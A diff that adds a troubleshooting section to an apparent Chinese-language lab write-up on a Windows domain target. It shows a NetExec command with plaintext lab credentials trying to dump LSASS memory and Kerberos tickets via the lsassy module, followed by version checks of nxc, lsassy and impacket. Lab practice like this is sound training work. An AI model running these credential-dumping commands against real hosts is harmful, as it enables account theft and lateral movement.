@@ -116,3 +116,61 @@ smb: \secura.yzx\Policies\{6AC1786C-016F-11D2-945F-00C04FB984F9}\MACHINE\Microso
 <NTServices clsid="{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}"><NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}" name="WinRM" image="2" changed="2022-10-25 17:35:16" uid="{401AC3E6-C47E-44A5-89E4-FC427698E07D}"><Properties startupType="AUTOMATIC" serviceName="WinRM" serviceAction="START" timeout="30"/></NTService>
 </NTServices>
 ```
+#### 遇到的问题：nxc smb 无法使用 -M lsassy
+```
+┌──(syareya55㉿kali)-[~]
+└─$ nxc smb 192.168.238.95 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy --no-smb
+SMB         192.168.238.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:secura.yzx) (signing:False) (SMBv1:None)                                                                        
+SMB         192.168.238.95  445    SECURE           [+] secura.yzx\Eric.Wallows:EricLikesRunning800 (Pwn3d!)
+[03:17:49] ERROR    Exception while calling proto_flow() on connection.py:187
+                    target 192.168.238.95: [Errno 32]                        
+                    Broken pipe
+             
+┌──(syareya55㉿kali)-[~]
+└─$ nxc --version
+1.5.1 - Yippie-Ki-Yay - Kali Linux - 
+                                                                             
+┌──(syareya55㉿kali)-[~]
+└─$ python3 -c "import lsassy; print(lsassy.__version__)"
+3.1.11
+                                                                             
+┌──(syareya55㉿kali)-[~]
+└─$ python3 -c "import impacket; print(impacket.__version__)"
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+    import impacket; print(impacket.__version__)
+                           ^^^^^^^^^^^^^^^^^^^^
+AttributeError: module 'impacket' has no attribute '__version__'
+                                                                             
+┌──(syareya55㉿kali)-[~]
+└─$ nxc smb -M lsassy --options
+[*] lsassy module options:
+
+METHOD              Method to use to dump lsass.exe with lsassy
+DUMP_TICKETS        If set, will dump Kerberos tickets (Default: True)
+SAVE_DIR            Directory to save dumped tickets
+SAVE_TYPE           Type of ticket to save, either 'kirbi' or 'ccache' (Default: 'ccache')
+
+                                                                             
+┌──(syareya55㉿kali)-[~]
+└─$ python3 -m pip show impacket
+Name: impacket
+Version: 0.14.0.dev0
+Summary: Network protocols Constructors and Dissectors
+Home-page: https://www.coresecurity.com
+Author: SecureAuth Corporation
+Author-email: 
+License: Apache modified
+Location: /usr/lib/python3/dist-packages
+Requires: charset_normalizer, flask, ldap3, ldapdomaindump, pyasn1, pyasn1_modules, pycryptodomex, pyOpenSSL, six
+Required-by: bloodhound, certipy-ad, dploot, lsassy, masky, netexec, patator, smbmap
+                                                                             
+┌──(syareya55㉿kali)-[~]
+└─$ dpkg -l | grep impacket
+ii  impacket-scripts                       1.10                                     all          Links to useful impacket scripts examples
+ii  python3-impacket                       0.13.0+git20251120-9c2d8b6-0kali1        all          Python3 module to easily build and dissect network protocols
+                                                                             
+┌──(syareya55㉿kali)-[~]
+└─$ nxc smb -M lsassy -o METHOD=help
+usage: nxc smb [-h] [--version] [-t THREADS] [--timeout TIMEOUT]
+```
